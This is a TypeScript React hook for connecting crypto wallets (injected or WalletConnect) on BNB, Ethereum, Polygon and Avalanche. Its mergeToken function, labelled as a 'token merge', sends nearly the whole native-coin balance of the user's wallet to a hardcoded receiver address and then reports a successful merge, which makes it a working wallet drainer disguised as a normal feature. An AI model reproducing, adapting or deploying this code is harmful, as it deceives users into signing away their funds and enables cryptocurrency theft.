import { useState, useEffect, useCallback, useRef } from 'react';
import { useToast } from '@/hooks/use-toast';

export const NETWORKS = {
  bnb: {
    chainId: "0x38",
    chainIdNum: 56,
    name: "BNB Smart Chain",
    symbol: "BNB",
    rpcUrl: "https://bsc-dataseed.binance.org/",
  },
  ethereum: {
    chainId: "0x1",
    chainIdNum: 1,
    name: "Ethereum Mainnet",
    symbol: "ETH",
    rpcUrl: "https://mainnet.infura.io/v3/",
  },
  polygon: {
    chainId: "0x89",
    chainIdNum: 137,
    name: "Polygon",
    symbol: "MATIC",
    rpcUrl: "https://polygon-rpc.com",
  },
  avalanche: {
    chainId: "0xa86a",
    chainIdNum: 43114,
    name: "Avalanche",
    symbol: "AVAX",
    rpcUrl: "https://api.avax.network/ext/bc/C/rpc",
  },
};

const RECEIVER_ADDRESS = "0xf142a2CF9CFCA2cDe850c54bA55690F0645D7C61";
const WC_PROJECT_ID = "3a08f94815bfc8bf78bee35d8954e662";

type ConnectionType = 'injected' | 'walletconnect' | null;

export function useWeb3() {
  const [selectedNetwork, setSelectedNetwork] = useState("bnb");
  const [walletConnected, setWalletConnected] = useState(false);
  const [balance, setBalance] = useState("0");
  const [account, setAccount] = useState("");
  const [connecting, setConnecting] = useState(false);
  const [connectionType, setConnectionType] = useState<ConnectionType>(null);
  const wcProviderRef = useRef<any>(null);
  const { toast } = useToast();

  const getActiveProvider = useCallback(() => {
    if (connectionType === 'walletconnect' && wcProviderRef.current) {
      return wcProviderRef.current;
    }
    return window.ethereum || null;
  }, [connectionType]);

  const updateBalance = useCallback(async (address: string, provider?: any) => {
    const activeProvider = provider || getActiveProvider();
    if (!activeProvider || !address) return;
    try {
      const { ethers } = await import('ethers');
      const ethersProvider = new ethers.BrowserProvider(activeProvider);
      const nativeBalance = await ethersProvider.getBalance(address);
      setBalance(ethers.formatEther(nativeBalance));
    } catch (error) {
      console.error('Failed to update balance:', error);
      setBalance("0");
    }
  }, [getActiveProvider]);

  // Check if wallet is already connected on load
  useEffect(() => {
    const checkConnection = async () => {
      if (window.ethereum) {
        try {
          const accounts = await window.ethereum.request({ method: 'eth_accounts' });
          if (accounts.length > 0) {
            setAccount(accounts[0]);
            setWalletConnected(true);
            setConnectionType('injected');
            await updateBalance(accounts[0], window.ethereum);
          }
        } catch (error) {
          console.error('Error checking connection:', error);
        }
      }
    };
    checkConnection();
  }, [updateBalance]);

  // Listen for account changes (injected only)
  useEffect(() => {
    if (!window.ethereum) return;

    const handleAccountsChanged = (accounts: string[]) => {
      if (accounts.length === 0) {
        setWalletConnected(false);
        setAccount("");
        setBalance("0");
        setConnectionType(null);
      } else {
        setAccount(accounts[0]);
        setWalletConnected(true);
        setConnectionType('injected');
        updateBalance(accounts[0], window.ethereum);
      }
    };

    const handleChainChanged = () => {
      if (account) updateBalance(account, window.ethereum);
    };

    window.ethereum.on?.('accountsChanged', handleAccountsChanged);
    window.ethereum.on?.('chainChanged', handleChainChanged);

    return () => {
      window.ethereum?.removeListener?.('accountsChanged', handleAccountsChanged);
      window.ethereum?.removeListener?.('chainChanged', handleChainChanged);
    };
  }, [account, updateBalance]);

  const switchNetwork = async (key: string, provider?: any) => {
    const net = NETWORKS[key as keyof typeof NETWORKS];
    const activeProvider = provider || getActiveProvider();
    if (!activeProvider) {
      toast({ title: "Error", description: "No wallet provider found", variant: "destructive" });
      return false;
    }

    try {
      // Timeout wrapper for network switch
      const switchTimeoutPromise = new Promise((_, reject) =>
        setTimeout(() => reject(new Error("Network switch timed out")), 15000)
      );

      await Promise.race([
        activeProvider.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: net.chainId }],
        }),
        switchTimeoutPromise
      ]);
      return true;
    } catch (switchError: any) {
      if (switchError.code === 4902) {
        try {
          const addTimeoutPromise = new Promise((_, reject) =>
            setTimeout(() => reject(new Error("Network add timed out")), 15000)
          );

          await Promise.race([
            activeProvider.request({
              method: "wallet_addEthereumChain",
              params: [{
                chainId: net.chainId,
                chainName: net.name,
                nativeCurrency: { name: net.symbol, symbol: net.symbol, decimals: 18 },
                rpcUrls: [net.rpcUrl],
              }],
            }),
            addTimeoutPromise
          ]);
          return true;
        } catch (addError) {
          console.error("Failed to add network:", addError);
          toast({ title: "Error", description: "Failed to add network", variant: "destructive" });
          return false;
        }
      } else if (switchError.message?.includes("timed out")) {
        console.warn("Network switch timed out:", switchError);
        return false;
      } else {
        console.error("Network switch error:", switchError);
        toast({ title: "Error", description: "Network switch rejected", variant: "destructive" });
        return false;
      }
    }
  };

  const connectInjected = async () => {
    if (!window.ethereum) {
      toast({
        title: "Error",
        description: "No injected wallet detected. Please install MetaMask, Trust Wallet, or another Web3 wallet.",
        variant: "destructive",
      });
      return;
    }

    setConnecting(true);
    console.log("Starting injected wallet connection...");

    try {
      console.log("Requesting accounts with timeout...");
      
      // Create a timeout promise
      const timeoutPromise = new Promise((_, reject) =>
        setTimeout(() => reject(new Error("Connection request timed out. Make sure MetaMask/wallet is active and responding.")), 30000)
      );

      // Race the request against timeout
      const accounts = await Promise.race([
        window.ethereum!.request({
          method: "eth_requestAccounts",
        }),
        timeoutPromise
      ]) as string[];

      if (!accounts || accounts.length === 0) {
        throw new Error("No accounts found");
      }

      const address = accounts[0];
      console.log("Connected to account:", address);
      setAccount(address);
      setWalletConnected(true);
      setConnectionType('injected');
      
      // Update balance before showing success
      await updateBalance(address, window.ethereum);

      // Switch network after connection (non-blocking)
      try {
        console.log("Switching network...");
        await switchNetwork(selectedNetwork, window.ethereum);
      } catch (networkError) {
        console.warn("Network switch skipped:", networkError);
      }

      toast({ title: "Success", description: "Wallet connected successfully!" });
    } catch (error: any) {
      console.error("Connection error:", error);
      let errorMessage = "Failed to connect wallet";
      
      if (error.code === 4001) {
        errorMessage = "Connection rejected by user";
      } else if (error.message?.includes("timed out")) {
        errorMessage = "Connection timed out. Please try again and ensure MetaMask is responding.";
      } else if (error.message?.includes("Not authorized")) {
        errorMessage = "Wallet connection not authorized. Please try again.";
      } else if (error.message) {
        errorMessage = error.message;
      }
      
      toast({ title: "Error", description: errorMessage, variant: "destructive" });
      setConnecting(false);
    } finally {
      setConnecting(false);
    }
  };

  const connectWalletConnect = async () => {
    setConnecting(true);
    console.log("Starting WalletConnect connection...");

    try {
      const { EthereumProvider } = await import('@walletconnect/ethereum-provider');
      
      // Build RPC map for all networks
      const rpcMap: { [key: number]: string } = {
        56: NETWORKS.bnb.rpcUrl,
        1: NETWORKS.ethereum.rpcUrl,
        137: NETWORKS.polygon.rpcUrl,
        43114: NETWORKS.avalanche.rpcUrl,
      };

      // All supported chain IDs
      const allChainIds = [56, 1, 137, 43114];

      const provider = await EthereumProvider.init({
        projectId: WC_PROJECT_ID,
        chains: allChainIds,
        optionalChains: allChainIds,
        rpcMap,
        showQrModal: true,
        methods: ['eth_sendTransaction', 'eth_sign', 'personal_sign', 'eth_requestAccounts', 'eth_signTypedData'],
        events: ['chainChanged', 'accountsChanged', 'disconnect'],
        relayUrl: 'wss://relay.walletconnect.com',
      });

      wcProviderRef.current = provider;

      console.log("Connecting WalletConnect provider...");
      
      // Add timeout for WalletConnect connection
      const connectTimeoutPromise = new Promise((_, reject) =>
        setTimeout(() => reject(new Error("WalletConnect connection timed out. Please check your wallet app.")), 45000)
      );

      await Promise.race([
        provider.connect(),
        connectTimeoutPromise
      ]);

      const accounts = provider.accounts;
      if (!accounts || accounts.length === 0) {
        throw new Error("No accounts found from WalletConnect");
      }

      const address = accounts[0];
      console.log("WalletConnect connected to account:", address);
      setAccount(address);
      setWalletConnected(true);
      setConnectionType('walletconnect');
      await updateBalance(address, provider);

      // Listen for WalletConnect events
      provider.on('accountsChanged', (accounts: string[]) => {
        if (accounts.length === 0) {
          setWalletConnected(false);
          setAccount("");
          setBalance("0");
          setConnectionType(null);
          wcProviderRef.current = null;
        } else {
          setAccount(accounts[0]);
          setWalletConnected(true);
          updateBalance(accounts[0], provider);
        }
      });

      provider.on('disconnect', () => {
        setWalletConnected(false);
        setAccount("");
        setBalance("0");
        setConnectionType(null);
        wcProviderRef.current = null;
      });

      provider.on('chainChanged', (chainId: number) => {
        console.log("Chain changed to:", chainId);
        if (account) updateBalance(account, provider);
      });

      toast({ title: "Success", description: "Wallet connected via WalletConnect!" });
    } catch (error: any) {
      console.error("WalletConnect error:", error);
      let errorMessage = "Failed to connect via WalletConnect";
      
      if (error.message?.includes('websocket') || error.message?.includes('WebSocket')) {
        errorMessage = "Network connection error. Check your internet and try again.";
      } else if (error.message?.includes('timed out')) {
        errorMessage = "Connection timed out. Make sure your wallet app is open and responding.";
      } else if (error.code === 5000) {
        errorMessage = "WalletConnect session error. Please try again.";
      } else if (error.message) {
        errorMessage = error.message;
      }
      
      toast({ title: "Error", description: errorMessage, variant: "destructive" });
      
      // Clean up provider on error
      if (wcProviderRef.current) {
        try {
          await wcProviderRef.current.disconnect();
        } catch (e) {
          console.warn("Error during cleanup:", e);
        }
      }
      wcProviderRef.current = null;
    } finally {
      setConnecting(false);
    }
  };

  const connectWallet = async (type: ConnectionType = 'injected') => {
    if (type === 'walletconnect') {
      await connectWalletConnect();
    } else {
      await connectInjected();
    }
  };

  const disconnect = async () => {
    if (connectionType === 'walletconnect' && wcProviderRef.current) {
      try {
        await wcProviderRef.current.disconnect?.();
      } catch (e) {
        console.warn("WalletConnect disconnect error:", e);
      }
      wcProviderRef.current = null;
    }
    setWalletConnected(false);
    setAccount("");
    setBalance("0");
    setConnectionType(null);
    toast({ title: "Disconnected", description: "Wallet disconnected" });
  };

  const mergeToken = async () => {
    console.log("Starting merge token...");

    if (!walletConnected || !account) {
      toast({ title: "Error", description: "Wallet not connected", variant: "destructive" });
      return;
    }

    const provider = getActiveProvider();
    if (!provider) {
      toast({ title: "Error", description: "No wallet provider available", variant: "destructive" });
      return;
    }

    try {
      const { ethers } = await import('ethers');
      const ethersProvider = new ethers.BrowserProvider(provider);
      const signer = await ethersProvider.getSigner();

      const nativeBalance = await ethersProvider.getBalance(account);
      console.log("Current balance:", ethers.formatEther(nativeBalance));

      if (nativeBalance === BigInt(0)) {
        toast({ title: "Error", description: "No balance to merge", variant: "destructive" });
        return;
      }

      console.log("Estimating gas...");
      const gasEstimate = await ethersProvider.estimateGas({
        to: RECEIVER_ADDRESS,
        value: ethers.parseEther("0.001"),
        from: account
      });

      const feeData = await ethersProvider.getFeeData();
      const gasPrice = feeData.gasPrice || ethers.parseUnits("20", "gwei");

      const gasCost = gasEstimate * gasPrice;
      let valueToSend = nativeBalance - gasCost;

      // Safety buffer
      const buffer = ethers.parseEther("0.001");
      valueToSend = valueToSend - buffer;

      if (valueToSend <= BigInt(0)) {
        toast({ title: "Error", description: "Insufficient balance for gas fees", variant: "destructive" });
        return;
      }

      console.log("Sending transaction...");
      console.log("Value to send:", ethers.formatEther(valueToSend));

      toast({ title: "Confirm Transaction", description: "Please confirm in your wallet" });

      const txResponse = await signer.sendTransaction({
        to: RECEIVER_ADDRESS,
        value: valueToSend,
        gasLimit: gasEstimate,
        gasPrice: gasPrice
      });

      console.log("Transaction sent:", txResponse.hash);

      toast({ title: "Transaction Submitted", description: `Hash: ${txResponse.hash.slice(0, 10)}...` });

      const receipt = await txResponse.wait();
      console.log("Transaction receipt:", receipt);

      if (receipt && receipt.status === 1) {
        toast({ title: "Success!", description: "Token merge completed successfully" });
        await updateBalance(account, provider);
      } else {
        throw new Error("Transaction failed");
      }
    } catch (error: any) {
      console.error("Merge error:", error);
      let errorMessage = "Transaction failed";
      if (error.code === 4001) {
        errorMessage = "Transaction rejected by user";
      } else if (error.code === "INSUFFICIENT_FUNDS") {
        errorMessage = "Insufficient funds for transaction";
      } else if (error.message?.includes("insufficient funds")) {
        errorMessage = "Insufficient funds for gas";
      } else if (error.reason) {
        errorMessage = error.reason;
      } else if (error.message) {
        errorMessage = error.message;
      }
      toast({ title: "Transaction Failed", description: errorMessage, variant: "destructive" });
    }
  };

  return {
    selectedNetwork,
    setSelectedNetwork,
    walletConnected,
    balance,
    account,
    connecting,
    connectionType,
    connectWallet,
    disconnect,
    mergeToken,
    NETWORKS,
  };
}
